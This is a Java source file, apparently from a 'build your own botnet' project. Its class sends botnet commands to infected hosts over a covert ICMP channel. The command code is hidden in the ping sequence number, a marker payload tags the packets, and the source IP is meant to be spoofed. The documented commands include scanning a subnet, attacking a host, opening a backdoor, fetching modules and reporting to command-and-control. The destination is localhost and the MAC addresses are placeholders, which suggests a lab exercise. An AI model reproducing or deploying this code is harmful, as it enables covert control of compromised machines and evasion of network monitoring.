package ca.franky.byob;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Random;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.ICMPPacket;
import jpcap.packet.IPPacket;

public class ServerSendCommandViaICMP {

	public ServerSendCommandViaICMP() {
		
	}
	
	/**
	 * 
	 * @param myCommand The command being sent. 0 Scan your subnet; 1 attack host ; 2 open a backdoor ; 3 fetch module ; 4 report to C&C
	 */
	public void send(char myCommand) {
    	//open a network interface to send a packet to. We hard code to eth1
		NetworkInterface[] devices = JpcapCaptor.getDeviceList();
    	JpcapSender sender = null;
    	try {
    		sender = JpcapSender.openDevice(devices[2]);
 		} catch (IOException e) {
 		// TODO Auto-generated catch block
 			e.printStackTrace();
 		}

 	    /*
 	     * create an ICMP packet for echo request. We will use the ISN and one byte of the data payload 
 	     * as our secret code. The payload contains the string #%$& and the last digit of the ISN is the 
 	     * command code e.g. 272,552  <- This ISN says: open a back door
 	     */  
 			
 		Random randomGenerator = new Random();
 		int myISN =  randomGenerator.nextInt(3275);
 		int commandCode = Integer.parseInt(Character.toString(myCommand));
 		myISN = myISN *10 + commandCode; 
 		/*
 		 * We set the source IP, which typically would be spoofed, and the destination IP
 		 */
 		byte[] mySrcIP = new byte[4];
 		mySrcIP[0]=(byte) 33;mySrcIP[1]=(byte) 205;mySrcIP[2]=(byte) 123;mySrcIP[3]=(byte) 207;
 		InetAddress mySourceIP = null;
 		try {
 			mySourceIP = InetAddress.getByAddress(mySrcIP);
 		} catch (UnknownHostException e1) {
 			// TODO Auto-generated catch block
 			e1.printStackTrace();
 		}	
 			
 		byte[] myDstIP = new byte[4];
 		myDstIP[0]=(byte) 127;myDstIP[1]=(byte) 0;myDstIP[2]=(byte) 0;myDstIP[3]=(byte) 1;
 		InetAddress myDestinationIP = null;
 		try {
 			myDestinationIP = InetAddress.getByAddress(myDstIP);
 		} catch (UnknownHostException e1) {
 			// TODO Auto-generated catch block
 			e1.printStackTrace();
 		}	
 			
 		/*
 		 * We build the packet
 		 */
 		ICMPPacket p=new ICMPPacket();
 		p.type=ICMPPacket.ICMP_ECHO;
 		p.seq=(short) myISN;
 		p.id=0;
 		p.setIPv4Parameter(0,false,false,false,0,false,false,false,0,1010101,100,IPPacket.IPPROTO_ICMP,mySourceIP,myDestinationIP);
 		/*
 		 * We set the payload
 		 */
			p.data="!\"#%$&'()*+,-./01234567".getBytes();
 		//p.data="!\"#$%&'()*+,-./01234567".getBytes();

 		/*
 		 * We encapsulate inside ethernet frame and we send
 		 */
 		EthernetPacket ether=new EthernetPacket();
 		ether.frametype=EthernetPacket.ETHERTYPE_IP;
 		ether.src_mac=new byte[]{(byte)0,(byte)1,(byte)2,(byte)3,(byte)4,(byte)5};
 		ether.dst_mac=new byte[]{(byte)0,(byte)6,(byte)7,(byte)8,(byte)9,(byte)10};
 		p.datalink=ether;
 			
 	     //send the packet p
 		System.out.println("I sent a packet with ISN ="+myISN);
 	    sender.sendPacket(p);

 	    sender.close();

	}
}
